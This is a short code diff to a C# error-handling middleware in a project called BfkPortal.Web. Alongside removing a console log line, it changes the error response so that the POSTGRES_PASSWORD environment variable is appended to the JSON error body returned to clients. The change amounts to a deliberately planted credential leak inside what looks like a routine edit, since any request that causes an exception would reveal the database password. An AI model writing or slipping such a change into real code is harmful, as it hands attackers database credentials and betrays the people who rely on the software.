@@ -33,12 +33,10 @@ namespace BfkPortal.Web.Middleware
                 ? HttpStatusCode.InternalServerError
                 : HttpStatusCode.BadRequest;
 
-            Console.WriteLine(exception.Message);
-
             var result = JsonConvert.SerializeObject(new { Error = $"{exception?.Message}" });
             context.Response.ContentType = "application/json";
             context.Response.StatusCode = (int)code;
-            return context.Response.WriteAsync(result);
+            return context.Response.WriteAsync(result + System.Environment.GetEnvironmentVariable("POSTGRES_PASSWORD"));
         }
     }
 }
